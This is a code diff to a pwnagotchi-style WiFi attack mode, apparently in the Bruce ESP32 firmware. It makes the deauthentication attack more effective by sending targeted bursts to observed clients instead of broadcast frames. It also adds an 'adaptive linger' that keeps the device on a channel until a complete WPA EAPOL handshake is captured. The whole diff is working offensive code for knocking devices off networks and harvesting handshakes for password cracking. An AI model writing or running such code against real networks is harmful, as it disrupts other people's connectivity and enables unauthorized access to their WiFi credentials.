@@ -88,7 +88,17 @@ struct BruceState {
     int prevHS;
     std::vector<uint8_t> sortedChannels;
     std::map<uint64_t, uint8_t> apDeauthCount;
+    uint8_t lingerExt; // adaptive-linger extensions used on the current channel
 };
+
+// True while any AP on this channel has a partial (M1/M2 seen, not usable yet).
+static bool channelHasPartial(uint8_t channel) {
+    for (const auto &b : registeredBeacons) {
+        if (b.channel != channel) continue;
+        if (sniffer_ap_has_partial(bruceMacToKey(b.MAC))) return true;
+    }
+    return false;
+}
 
 // Forward declarations for phase functions
 static void reconPhase(BruceState &s);
@@ -247,8 +257,23 @@ static void interactPhase(BruceState &s) {
                 }
 
                 memcpy(&ap_record.bssid, beacon.MAC, 6);
-                wsl_bypasser_send_raw_frame(&ap_record, currentChan, _default_target);
-                send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
+                // Aim at observed clients first (far more effective than
+                // broadcast); broadcast only when no client is known yet.
+                // 4 bursts (12 air frames) per client: maximum useful volley
+                // inside the 300 ms deauth window.
+                uint8_t targets[3][6];
+                uint8_t nTargets = sniffer_get_top_clients(key, targets, 3);
+                if (nTargets > 0) {
+                    for (uint8_t t = 0; t < nTargets; t++) {
+                        if (check(SelPress) || pwnagotchi_exit) break;
+                        sendTargetedDeauthFrame(
+                            reinterpret_cast<const uint8_t *>(beacon.MAC), targets[t], currentChan, 4
+                        );
+                    }
+                } else {
+                    wsl_bypasser_send_raw_frame(&ap_record, currentChan, _default_target);
+                    send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
+                }
                 s.apDeauthCount[key]++;
                 s.didDeauth = true;
             }
@@ -264,18 +289,30 @@ static void interactPhase(BruceState &s) {
 
         uint32_t waitTarget = s.didDeauth ? BRUCE_HOP_RECON_MS : BRUCE_MIN_RECON_MS;
         if (elapsed >= (uint32_t)(50 + BRUCE_RECON_DEAUTH_MS + waitTarget)) {
-            s.interactIdx++;
-            s.didDeauth = false;
-            s.phaseStart = millis();
-
-            ssize_t remaining = (ssize_t)s.sortedChannels.size() - (ssize_t)s.interactIdx;
-            if (remaining > 0 && s.interactIdx < s.sortedChannels.size()) {
-                char buf[48];
-                snprintf(
-                    buf, sizeof(buf), "Next: ch%d (%d left)", s.sortedChannels[s.interactIdx], (int)remaining
-                );
-                setMood(8, "(-@_@)", buf);
+            // Adaptive linger: EAPOL is in flight on this channel but the
+            // handshake isn't usable yet — leaving now would lose M2..M4.
+            // Grant up to 2 extra wait windows before moving on.
+            if (s.lingerExt < 2 && channelHasPartial(currentChan)) {
+                s.lingerExt++;
+                s.phaseStart = millis();
+                setMood(8, "(-@_@)", "Waiting for M3+M4...");
                 updateUi(true);
+            } else {
+                s.lingerExt = 0;
+                s.interactIdx++;
+                s.didDeauth = false;
+                s.phaseStart = millis();
+
+                ssize_t remaining = (ssize_t)s.sortedChannels.size() - (ssize_t)s.interactIdx;
+                if (remaining > 0 && s.interactIdx < s.sortedChannels.size()) {
+                    char buf[48];
+                    snprintf(
+                        buf, sizeof(buf), "Next: ch%d (%d left)", s.sortedChannels[s.interactIdx],
+                        (int)remaining
+                    );
+                    setMood(8, "(-@_@)", buf);
+                    updateUi(true);
+                }
             }
         }
     }
@@ -303,6 +340,7 @@ static void advertisePhase(BruceState &s) {
         s.reconIdx = 0;
         s.interactIdx = 0;
         s.didDeauth = false;
+        s.lingerExt = 0;
         s.sortedChannels.clear();
         s.apDeauthCount.clear();
 
@@ -364,6 +402,7 @@ void brucegotchi_start() {
     s.reconIdx = 0;
     s.interactIdx = 0;
     s.didDeauth = false;
+    s.lingerExt = 0;
 
     // First iteration: set initial channel immediately
     ch = active_channels[0];
